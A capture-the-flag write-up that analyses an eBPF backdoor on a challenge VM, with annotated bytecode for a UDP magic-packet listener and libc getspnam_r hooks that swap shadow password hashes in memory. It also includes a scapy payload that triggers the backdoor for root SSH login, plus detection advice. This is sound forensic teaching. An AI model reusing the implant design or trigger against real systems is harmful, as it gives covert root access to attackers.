# Crowdstrike Adversary Quest 2021 / Protective Penguin / #3 Egg Hunt

## Challenge Description
After moving laterally, PROTECTIVE PENGUIN compromised a number of additional systems and gained persistence. We have identified another host in the DMZ that we believe was backdoored by the adversary and is used to regain access.
Please download a virtual machine image of that host and identify the backdoor. Validate your findings in our test environment on egghunt.challenges.adversary.zone.

## Pre-Requisites
This challenge consists of a qcow2 image, that needs qemu to run. In case qemu isn't installed, yet, now is a good time to do so. ;-)
```
sudo apt install qemu-system-x86
```

qemu-img can be used to list snapshots of this image.
```
qemu-img snapshot -l art_ctf_egghunt_local.qcow2 
Snapshot list:
ID        TAG               VM SIZE                DATE     VM CLOCK     ICOUNT
1         compromised       497 MiB 2021-01-14 13:15:30 00:01:55.747                 
```

The run.sh script uses qemu-system-x86_64 to run the image.
```
./run.sh 
Restoring snapshot compromised (art_ctf_egghunt_local.qcow2)
Press Return...
```

One of the options used for qemu inside run.sh is setting up port forwarding for the custom ports tcp/4422 and udp/1337 from host to guest system.
```
hostfwd=tcp::4422-:4422,hostfwd=udp::1337-:1337
```

## Emurate Network Services with Listen Ports
So, which network services might listen of the forwarded custom ports?
```
root@egghunt:~# netstat -pantu
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:4422            0.0.0.0:*               LISTEN      379/sshd: /usr/sbin 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      365/systemd-resolve 
tcp6       0      0 :::4422                 :::*                    LISTEN      379/sshd: /usr/sbin 
udp        0      0 127.0.0.53:53           0.0.0.0:*                           365/systemd-resolve 
udp        0      0 0.0.0.0:68              0.0.0.0:*                           587/dhclient 
```
```
root@egghunt:/var/log# lsof -i
COMMAND   PID            USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
systemd-r 365 systemd-resolve   12u  IPv4  20531      0t0  UDP 127.0.0.53:domain
systemd-r 365 systemd-resolve   13u  IPv4  20532      0t0  TCP 127.0.0.53:domain (LISTEN)
sshd      379            root    3u  IPv4  21311      0t0  TCP *:4422 (LISTEN)
sshd      379            root    4u  IPv6  21322      0t0  TCP *:4422 (LISTEN)
dhclient  587            root    9u  IPv4  23072      0t0  UDP *:bootpc
```
Looks like there is an sshd process with PID 379 listening on tcp port 4422 but no process seems to be listening on udp port 1337. Weird, why would there be a port forward rule for qemu then? This is of course a bit of a cheat hint, as compromised systems usually don't come with such nicely laid out forward rules in real IR. ;-)

## Nmap Scan of Backdoored Target Server
It would be interesting to verify if one or both of these custom ports are open on the target server.
There was no (sshd) network service listening on tcp port 4422, but there was one listening on the common tcp port 22. And udp port 1337 seems to be closed. Hmm.
```
sudo nmap -sU -p 1337,53,68 egghunt.challenges.adversary.zone 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 20:00 CET
Nmap scan report for egghunt.challenges.adversary.zone (144.76.211.234)
Host is up (0.012s latency).
rDNS record for 144.76.211.234: static.234.211.76.144.clients.your-server.de

PORT     STATE         SERVICE
53/udp   closed        domain
68/udp   open|filtered dhcpc
1337/udp closed        menandmice-dns
```

## Searching for Signs of the Backdoor Mechanism

### Rabbit Hole - Dumping Process Memory of sshd
Using the tool **gcore**, one can dump an image of a process' memory to disk. Since there seems to be only one network service with a listening port to inspect (sshd), it for some reason appeared to be clever to dig down deep into a rabbit hole instead of doing a proper system survey first. To generate a core file for sshd (PID 379):
```
gcore 379 
```

The resulting image can be thoroughly inspected for strings, but also for signs of the usage of network activity around udp port 1337 (little endian hex = 3905).
Since there wasn't anything useful to be found, it was time to do some backtracking and checking for other signs of system anomalies.

### Out of the Rabbit Hole, why not checking some System Logfiles instead?
Peeking into /var/log/syslog.1
```
Jan 14 12:15:16 egghunt systemd[1]: Stopping Regular background program processing daemon...
Jan 14 12:15:16 egghunt systemd[1]: cron.service: Succeeded.
Jan 14 12:15:16 egghunt systemd[1]: Stopped Regular background program processing daemon.
Jan 14 12:15:16 egghunt systemd[1]: session-5.scope: Succeeded.
Jan 14 12:15:16 egghunt systemd[1]: Started Session 6 of user root.
Jan 14 12:15:17 egghunt kernel: [   86.289920] cron[971] is installing a program with bpf_probe_write_user helper that may corrupt user memory!
Jan 14 12:15:17 egghunt cron[971]: (CRON) INFO (pidfile fd = 12)
```

Peeking into /var/log/kern.log.1
```
Jan 14 12:14:22 egghunt kernel: [   32.332402] kauditd_printk_skb: 2 callbacks suppressed
Jan 14 12:14:22 egghunt kernel: [   32.332403] audit: type=1400 audit(1610626462.740:13): apparmor="DENIED" operation="open" profile="/{,usr/}sbin/dhclient" name="/proc/587/task/588/comm" pid=587 comm="dhclient" requested_mask="wr" denied_mask="wr" fsuid=0 ouid=0
Jan 14 12:14:22 egghunt kernel: [   32.332652] audit: type=1400 audit(1610626462.740:14): apparmor="DENIED" operation="open" profile="/{,usr/}sbin/dhclient" name="/proc/587/task/589/comm" pid=587 comm="dhclient" requested_mask="wr" denied_mask="wr" fsuid=0 ouid=0
Jan 14 12:14:22 egghunt kernel: [   32.332775] audit: type=1400 audit(1610626462.740:15): apparmor="DENIED" operation="open" profile="/{,usr/}sbin/dhclient" name="/proc/587/task/590/comm" pid=587 comm="dhclient" requested_mask="wr" denied_mask="wr" fsuid=0 ouid=0
Jan 14 12:15:17 egghunt kernel: [   86.289920] cron[971] is installing a program with bpf_probe_write_user helper that may corrupt user memory!
Jan 14 12:15:31 egghunt kernel: [   86.289928] cron[971] is installing a program with bpf_probe_write_user helper that may corrupt user memory!
```

Hmm. What's this about?
```
Jan 14 12:15:17 egghunt kernel: [   86.289920] cron[971] is installing a program with bpf_probe_write_user helper that may corrupt user memory!
```

Something called **bpf_probe_write_user** may corrupt user memory? That definitely doesn't sound like cron (PID 971) played a safe game there!
The list of running processes does not contain a cron process with PID 971, but one with a PID of 974. Can't hurt to dive down again dumping this one's process memory with gcore!
```
gcore 974 
```

Are there suspicious strings containing bpf inside this core dump?
```
root@egghunt:/tmp# strings core.974 | grep bpf
nodev   bpf
implant_bpf
implant_bpf
/home/user/git/bcc/libbpf-tools/implant.bpf.c
[...]
```

Jackpot! So we are looking for a backdoor implant using bpf. Maybe there is some kind of port knocking mechanism around udp port 1337?


The cron process with PID 974 also has weird file descriptors open.
```
root@egghunt:/proc/974/fd# ls -la
total 0
dr-x------ 2 root root  0 Jan 26 20:14 .
dr-xr-xr-x 9 root root  0 Jan 14 12:15 ..
lr-x------ 1 root root 64 Jan 26 20:14 0 -> /dev/null
l-wx------ 1 root root 64 Jan 26 20:14 1 -> /dev/null
lrwx------ 1 root root 64 Jan 26 20:14 10 -> 'anon_inode:[perf_event]'
lrwx------ 1 root root 64 Jan 26 20:14 11 -> 'anon_inode:[perf_event]'
lrwx------ 1 root root 64 Jan 26 20:14 12 -> /run/crond.pid
lrwx------ 1 root root 64 Jan 26 20:14 13 -> 'socket:[24485]'
l-wx------ 1 root root 64 Jan 26 20:14 2 -> /dev/null
lr-x------ 1 root root 64 Jan 26 20:14 3 -> anon_inode:btf
lrwx------ 1 root root 64 Jan 26 20:14 4 -> anon_inode:bpf-map
lrwx------ 1 root root 64 Jan 26 20:14 5 -> anon_inode:bpf-map
lrwx------ 1 root root 64 Jan 26 20:14 6 -> anon_inode:bpf-prog
lrwx------ 1 root root 64 Jan 26 20:14 7 -> anon_inode:bpf-prog
lrwx------ 1 root root 64 Jan 26 20:14 8 -> anon_inode:bpf-prog
lrwx------ 1 root root 64 Jan 26 20:14 9 -> 'anon_inode:[perf_event]'
```

```
root@egghunt:/proc/974/fd# lsof -p 974
COMMAND PID USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME
[...]
cron    974 root    3r  a_inode               0,13        0  12123 btf
cron    974 root    4u  a_inode               0,13        0  12123 bpf-map
cron    974 root    5u  a_inode               0,13        0  12123 bpf-map
cron    974 root    6u  a_inode               0,13        0  12123 bpf-prog
cron    974 root    7u  a_inode               0,13        0  12123 bpf-prog
cron    974 root    8u  a_inode               0,13        0  12123 bpf-prog
cron    974 root    9u  a_inode               0,13        0  12123 [perf_event]
cron    974 root   10u  a_inode               0,13        0  12123 [perf_event]
cron    974 root   11u  a_inode               0,13        0  12123 [perf_event]
cron    974 root   12u      REG               0,24        4    436 /run/crond.pid
cron    974 root   13u     unix 0xffff96bbcd1f6000      0t0  24485 type=DGRAM
```

## What's this BPF Stuff about?
Up to this CTF challenge, I only used Berkeley Packet Filter (BPF) with network tools like tcpdump or wireshark. The Linux kernel contains a BPF virtual machine dubbed extended BPF (eBPF) that allows for much more than that including Software Defined Networking (SDN). Also Compilers like LLVM and GCC can generate eBPF code.

```
In some ways, eBPF does to the kernel what JavaScript does to websites: it allows all sorts of new applications to be created. BPF is now used for software defined networking, observability (this book), security enforcement, and more. The main front-ends for BPF performance tools are BCC and bpftrace
```

The eBPF virtual machine is working with RISC style bytecode.
```
BPF consists of eleven 64 bit registers with 32 bit subregisters, a program counter and a 512 byte large BPF stack space. Registers are named r0 - r10. The operating mode is 64 bit by default, the 32 bit subregisters can only be accessed through special ALU (arithmetic logic unit) operations. The 32 bit lower subregisters zero-extend into 64 bit when they are being written to.
Register r10 is the only register which is read-only and contains the frame pointer address in order to access the BPF stack space. The remaining r0 - r9 registers are general purpose and of read/write nature.
A BPF program can call into a predefined helper function, which is defined by the core kernel (never by modules). The BPF calling convention is defined as follows:
r0 contains the return value of a helper function call.
r1 - r5 hold arguments from the BPF program to the kernel helper function.
r6 - r9 are callee saved registers that will be preserved on helper function call.
```

BPF Type Format (BTF) definition.
```
BTF (BPF Type Format) is the metadata format which encodes the debug info related to BPF program/map. The name BTF was used initially to describe data types. The BTF was later extended to include function info for defined subroutines, and line info for source/line information.
```

Some links that I've quoted from and can be used for reading up:
- [www.brendanregg.com](http://www.brendangregg.com/bpf-performance-tools-book.html)
- [www.brendanregg.com2](http://www.brendangregg.com/blog/2016-02-08/linux-ebpf-bcc-uprobes.html)
- [ebpf.io](https://ebpf.io)
- [docs.cilium.io](https://docs.cilium.io/en/latest/bpf/)
- [bcc reference guide](https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md)

One tool to interact with eBPF is **bpftool**.
```
root@egghunt:/tmp# bpftool 
Usage: /usr/lib/linux-tools/5.8.0-33-generic/bpftool [OPTIONS] OBJECT { COMMAND | help }
       /usr/lib/linux-tools/5.8.0-33-generic/bpftool batch file FILE
       /usr/lib/linux-tools/5.8.0-33-generic/bpftool version

       OBJECT := { prog | map | link | cgroup | perf | net | feature | btf | gen | struct_ops | iter }
       OPTIONS := { {-j|--json} [{-p|--pretty}] | {-f|--bpffs} |
                    {-m|--mapcompat} | {-n|--nomount} }
```

## Searching for eBPF Backdoor Code with bpftool
Query BTF information.
```
root@egghunt:/tmp# bpftool btf
5: size 6600B  prog_ids 18,17,16  map_ids 4,3
```

Query data about prog_ids 16, 17, 18.
```
root@egghunt:/tmp# bpftool prog show
[...]
16: tracepoint  name kprobe_netif_re  tag e0d014d973f44213  gpl
        loaded_at 2021-02-09T20:33:16+0000  uid 0
        xlated 2344B  jited 1544B  memlock 4096B  map_ids 4
        btf_id 5
17: kprobe  name getspnam_r_entr  tag acab388c8f8ef0f9  gpl
        loaded_at 2021-02-09T20:33:16+0000  uid 0
        xlated 336B  jited 223B  memlock 4096B  map_ids 3
        btf_id 5
18: kprobe  name getspnam_r_exit  tag ceeabb4ac5b9ed45  gpl
        loaded_at 2021-02-09T20:33:16+0000  uid 0
        xlated 328B  jited 209B  memlock 4096B  map_ids 3,4
        btf_id 5
```

```
root@egghunt:/tmp# bpftool perf
pid 974  fd 9: prog_id 16  tracepoint  netif_receive_skb
pid 974  fd 10: prog_id 17  uprobe  filename /lib/x86_64-linux-gnu/libc.so.6  offset 1174224
pid 974  fd 11: prog_id 18  uretprobe  filename /lib/x86_64-linux-gnu/libc.so.6  offset 1174224
```

Query data about map_ids 3, 4.
```
root@egghunt:/tmp# bpftool map list
3: hash  name args  flags 0x0
        key 8B  value 8B  max_entries 10  memlock 4096B
        btf_id 5
4: array  name implant_.bss  flags 0x400
        key 4B  value 36B  max_entries 1  memlock 8192B
        btf_id 5
```

```
root@egghunt:/tmp# bpftool map dump id 4
[{
        "value": {
            ".bss": [{
                    "backdoor": {
                        "enabled": false,
                        "hash": ""
                    }
                }
            ]
        }
    }
]
```

Interesting: map_id 4 contains a struct *backdoor* with an attribute *enabled* and another one called *hash*.

### Interim Conclusion/Hypothesis: eBPF prog_id 16
```
pid 974  fd 9: prog_id 16  tracepoint  netif_receive_skb
```
- A tracepoint on netif_receive_skb [main receive data processing function](https://www.kernel.org/doc/htmldocs/networking/API-netif-receive-skb.html)
- Probably some kind of packet sniffing code
- Might trigger on *magic* packets (like udp port 1337?)
- Uses map_id 4 (like a variable/buffer), which has attributes *enabled* and *hash*

### Interim Conclusion/Hypothesis: eBPF prog_id 17
```
pid 974  fd 10: prog_id 17  uprobe  filename /lib/x86_64-linux-gnu/libc.so.6  offset 1174224
17: kprobe  name getspnam_r_entr  tag acab388c8f8ef0f9  gpl
```
- kprobe is named *getspnam_r_entr*
- eBPF code triggers on entry of the user mode libc function at offset 1174224
- libc.so.6 offset 1174224 (0x11ead0) -> function getspnam_r, which handles a retrieved shadow password structure
- Uses map_id 3 (like a variable/buffer), which has an attributed called *hash*

### Interim Conclusion/Hypothesis: eBPF prog_id 18
```
pid 974  fd 11: prog_id 18  uretprobe  filename /lib/x86_64-linux-gnu/libc.so.6  offset 1174224
18: kprobe  name getspnam_r_exit  tag ceeabb4ac5b9ed45  gpl
```
- kprobe is named *getspnam_r_exit*
- eBPF code triggers on exit from the user mode libc function getspnam_r
- Uses map_id 3 and 4 (like a variable/buffer)

### Deep Dive eBPF code for prog_id 16
Enough tl;dr, time for some real code analysis!
The output of bpftool is shortened and commented for readability purposes.
```
root@egghunt:/sys/kernel/debug/tracing/events/net/netif_receive_skb# bpftool prog dump xlated id 16 
int kprobe_netif_receive_skb(struct netif_receive_skb_args * args):
 
  33: (79) r3 = *(u64 *)(r1 +8)                  # function arg3 (src), u64 pointer to skb + 8
  36: (bf) r1 = r6                               # function arg1 (dst), stack pointer
  37: (b7) r2 = 224                              # function arg2 (len), value 224
  38: (85) call bpf_probe_read_compat#-54752     # read 224 bytes from skb+8

  44: (bf) r1 = r10
  45: (07) r1 += -24                             # dst on stack
  46: (b7) r2 = 20                               # len
  47: (bf) r3 = r6                               # src, smells like packet offset to ip header
  48: (85) call bpf_probe_read_compat#-54752     # read first 20 bytes from offset to ip header

  49: (55) if r0 != 0x0 goto pc+241              # exit if read failed
  50: (bf) r1 = r10
  51: (07) r1 += -24
  52: (71) r1 = *(u8 *)(r1 +0)                   # u8 pointer to ip[0]
  53: (57) r1 &= 240                             # ip[0] & 0xf0, mask for high nibble -> ip version
  54: (55) if r1 != 0x40 goto pc+236             # exit if ip version != 4
  55: (bf) r1 = r10
  56: (07) r1 += -24
  57: (71) r1 = *(u8 *)(r1 +9)                   # u8 pointer to ip[9] -> protocol
  58: (55) if r1 != 0x11 goto pc+232             # exit if protocol != 0x11 (not udp)
  59: (bf) r1 = r10
  60: (07) r1 += -24
  61: (71) r1 = *(u8 *)(r1 +0)                   # u8 pointer to ip[0]
  62: (57) r1 &= 15                              # ip[0] & 0x0f, mask lower nibble -> ip header length (in double words)
  63: (55) if r1 != 0x5 goto pc+227              # exit if ip header len != 20 bytes (i.e. contains ip options)

  64: (07) r6 += 20                              # set src pointer behind ip header
  65: (bf) r1 = r10
  66: (07) r1 += -32                             # dst on stack
  67: (b7) r2 = 8                                # len = 8 bytes
  68: (bf) r3 = r6                               # src, just behind ip header
  69: (85) call bpf_probe_read_compat#-54752     # read 8 bytes after ip header, i.e. udp header (always 8 bytes)
  70: (55) if r0 != 0x0 goto pc+220              # exit if read failed
  71: (bf) r1 = r10
  72: (07) r1 += -32
  73: (69) r1 = *(u16 *)(r1 +2)                  # u16 pointer to udp dst port
  74: (55) if r1 != 0x3905 goto pc+216           # exit if udp dst port != 1337
  75: (bf) r1 = r10
  76: (07) r1 += -32
  77: (69) r1 = *(u16 *)(r1 +4)                  # u16 pointer to udp len
  78: (55) if r1 != 0x2a00 goto pc+212           # exit if udp len != 42
  79: (b7) r1 = 0

  85: (07) r6 += 8                               # set read pointer to just behind udp header
  86: (bf) r1 = r10
  87: (07) r1 += -296                            # dst on stack
  88: (b7) r2 = 34                               # len = 34 bytes
  89: (bf) r3 = r6                               # src pointer, behind udp header
  90: (85) call bpf_probe_read_compat#-54752     # read 34 bytes after udp header, i.e. full udp payload (42 - 8)

  91: (71) r1 = *(u8 *)(r10 -296)                # pointer to first udp data byte on stack
  92: (55) if r1 != 0x66 goto pc+198             # exit if first byte != 0x66 ('f')
  93: (71) r1 = *(u8 *)(r10 -295)                # pointer to second byte
  94: (55) if r1 != 0x73 goto pc+196             # exit if second byte != 0x73 ('s')
  95: (71) r1 = *(u8 *)(r10 -294)                # pointer to third byte
  96: (55) if r1 != 0x66 goto pc+194             # exit if third byte != 0x66 ('f')
  97: (b7) r1 = 36
  98: (73) *(u8 *)(r10 -294) = r1                # replace third byte with 36 ('$')
  99: (b7) r1 = 12580
 100: (6b) *(u16 *)(r10 -296) = r1               # replace first two bytes with 0x3124 ('$1') - little endian!
                                                 # 'fsf' has been replaced with '$1$'
                                                 # that smells a lot like crypt hash type 1 -> md5
                                                 
 101: (71) r1 = *(u8 *)(r10 -293)                # read fourth byte
 102: (a7) r1 ^= 66                              # xor with 66 ('B')
 103: (73) *(u8 *)(r10 -293) = r1                # replace fourth byte with xor'd value

 191: (71) r1 = *(u8 *)(r10 -263)                # read 34th byte/last of udp payload
 192: (a7) r1 ^= 66
 193: (73) *(u8 *)(r10 -263) = r1                # payload[34] ^= 66

 194: (18) r1 = map[id:4][0]+0                   # let r1 point to map_id 4
 
 196: (79) r2 = *(u64 *)(r10 -272)               # write udp payload xor'd with 66 to map_id 4, attribute hash
 197: (bf) r3 = r2
 198: (77) r3 >>= 56

 289: (b7) r2 = 1
 290: (73) *(u8 *)(r1 +0) = r2                   # write 1 (true) to map_id 4 offset 0, attribute enabled
 
 291: (b7) r0 = 0
 292: (95) exit
```

### Analysis of prog_id 16, Proven Hypothesis
Checks done on each processed packet are:
- ip version = 4
- ip header len = 20 bytes
- ip protocol = 0x11 (udp)
- udp dst port = 1337 (0x3905, little endian)
- udp len = 42 (0x2a00, little endian)
- udp payload begins with 'fsf' (0x66, 0x73, 0x66)

If all checks succeed, this is a **magic** packet to enable the backdoor and write an md5crypt hash into map_id 4. Value of this hash is taken from udp payload bytes 4-34, xor'd with 66 ('B').

### Deep Dive eBPF code for prog_id 17
The output of bpftool is shortened and commented for readability purposes.
```
root@egghunt:/sys/kernel/debug/tracing/events/net/netif_receive_skb# bpftool prog dump xlated id 17
int getspnam_r_entry(long long unsigned int * ctx):
   0: (bf) r3 = r1                               # src = *ctx
  23: (bf) r1 = r10
  24: (07) r1 += -168                            # dst on stack
  25: (b7) r2 = 168                              # len = 168 bytes
  26: (85) call bpf_probe_read_compat#-54752     # read 168 bytes from *ctx

  27: (55) if r0 != 0x0 goto pc+12               # exit on failed read

  28: (85) call bpf_get_current_pid_tgid#119360
  29: (7b) *(u64 *)(r10 -176) = r0               # write pid_tgid to stack r10 - 176
                            
  36: (18) r1 = map[id:3]
  38: (b7) r4 = 0
  39: (85) call htab_map_update_elem#134224      # write shadow entry to map_id 3
  
  40: (b7) r0 = 0
  41: (95) exit
```

### Analysis of prog_id 17
There doesn't seem to be much magic here. The shadow password hash from *ctx is likely to be written to map_id 3.

### Deep Dive eBPF code for prog_id 18
The output of bpftool is shortened a lot and commented for readability purposes.
```
int getspnam_r_exit(long long unsigned int * ctx):
   0: (85) call bpf_get_current_pid_tgid#119360

   4: (18) r1 = map[id:3]
   6: (85) call __htab_map_lookup_elem#128720

  17: (85) call bpf_probe_read_user#-60320              # likely reading to acquite dst pointer to target process
                                                        # that was acquiring a user's shadow password hash via getspnam_r

  19: (18) r1 = map[id:4][0]+0                          # map_id 4 offset 0, attribute enabled
  21: (71) r1 = *(u8 *)(r1 +0)
  22: (15) if r1 == 0x0 goto pc+11                      # exit if backdoor is not enabled

  25: (18) r6 = map[id:4][0]+0
  27: (18) r2 = map[id:4][0]+0
  29: (07) r2 += 1                                      # src = map_id 4 offset 1, attribute hash
  30: (b7) r3 = 35                                      # len 35
  31: (85) call bpf_probe_write_user#-59968             # write hash from map_id 4 to target process
                                                        # likely resulting in overwriting the shadow password hash
                                                        # read by target process from shadow file with hash from magic packet

  36: (18) r1 = map[id:3]
  38: (85) call htab_map_delete_elem#134016             # clean up

  39: (b7) r0 = 0
  40: (95) exit
```

### Analysis of prog_id 18
Not much code to stare at here, either. But this eBPF code likely overwrites the shadow password hash, that the target process acquired for a user (like sshd, for login purposes), with the hash value that was transferred via the magic packet.

## Crafting the Magic Packet
Now that the *magic* has been identified, it's time to craft a packet that will trigger the eBPF code. In the first tests, I was sending the crafted packet from host to qemu guest system, expecting the forward rule for udp dst port 1337 to work. For some reason, it didn't.
For local testing purposes, scapy may as well be installed to the guest system via:
```
apt install python3-scapy
```

Generate an md5crypt hash for the password 'pass':
```
mkpasswd -m md5crypt
Password: pass
$1$wtuNYIeB$Bo28F812s3/AhXWZWIcso.
```

XOR the hash value (without $1$ prefix!) with 66 ('B') yields:
```
35 36 37 0c 1b 0b 27 00 66 00 2d 70 7a 04 7a 73 70 31 71 6d 03 2a 1a 15 18 15 0b 21 31 2d 6c
```
See [CyberChef](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Decimal','string':'66'%7D,'Standard',false)To_Hex('Space',0)&input=d3R1TllJZUIkQm8yOEY4MTJzMy9BaFhXWldJY3NvLg)

Craft and send the full packet (udp dst port 1337, udp len 42, udp payload begins with 'fsf' followed by XOR'd hash value)
```
>>> p = IP(dst="127.0.0.1")/UDP(dport=1337, len=0x2a)/Raw("fsf"+"\x35\x36\x37\x0
...: c\x1b\x0b\x27\x00\x66\x00\x2d\x70\x7a\x04\x7a\x73\x70\x31\x71\x6d\x03\x2a\x
...: 1a\x15\x18\x15\x0b\x21\x31\x2d\x6c")
>>> send(p)
.
Sent 1 packets.
```

Verify that the backdoor is enabled and the hash value has been set:
```
root@egghunt:/proc/974/fd# bpftool -p map dump id 4
[{
        "key": ["0x00","0x00","0x00","0x00"
        ],
        "value": ["0x01","0x24","0x31","0x24","0x77","0x74","0x75","0x4e","0x59","0x49","0x65","0x42","0x24","0x42","0x6f","0x32","0x38","0x46","0x38","0x31","0x32","0x73","0x33","0x2f","0x41","0x68","0x58","0x57","0x5a","0x57","0x49","0x63","0x73","0x6f","0x2e","0x00"
        ],
        "formatted": {
            "value": {
                ".bss": [{
                        "backdoor": {
                            "enabled": true,
                            "hash": "$1$wtuNYIeB$Bo28F812s3/AhXWZWIcso."
                        }
                    }
                ]
            }
        }
    }
]
```
W00t!

## Now it's Flag Time!
Send the magic packet to put hash for md5crypt password of **pass** into bpf backdoor.
```
>>> p = IP(dst="egghunt.challenges.adversary.zone")/UDP(dport=1337, len=0x2a)/Raw("fsf"+"\x35\x36\x37\x0c\x1b\x0b\x27\x00\x66\x00\x2d\x70\x7a\x04\x7a\x73\x70\x31\x71\x6d\x03\x2a\x1a\x15\x18\x15\x0b\x21\x31
...: \x2d\x6c")
>>> p
<IP  frag=0 proto=udp dst=Net('egghunt.challenges.adversary.zone') |<UDP  dport=1337 len=42 |<Raw  load="fsf567\x0c\x1b\x0b'\x00f\x00-pz\x04zsp1qm\x03*\x1a\x15\x18\x15\x0b!1-l" |>>>
>>> send(p)
.
Sent 1 packets.
```

Login with creds **root** / **pass**.
```
ssh -l root egghunt.challenges.adversary.zone
root@egghunt.challenges.adversary.zone's password: 
PTY allocation request failed on channel 0
CS{ebpf_b4ckd00r_ftw}
Connection to egghunt.challenges.adversary.zone closed.
```

Flag: **CS{ebpf_b4ckd00r_ftw}**

## Conclusion
This challenge has been another great learning experience, comprising different aspects of cyber security offense and defense.
The backdoor is triggered through bpf bytecode, hooking the libc function getspnam_r and listening for magic packets to replace password hashes in-memory.
There is no extra listen port, no seperate backdoor process running.
Detection can be achieved by monitoring critical system log entries and weird file descriptor changes to processes. That, and using bpftool to check for anomalies.
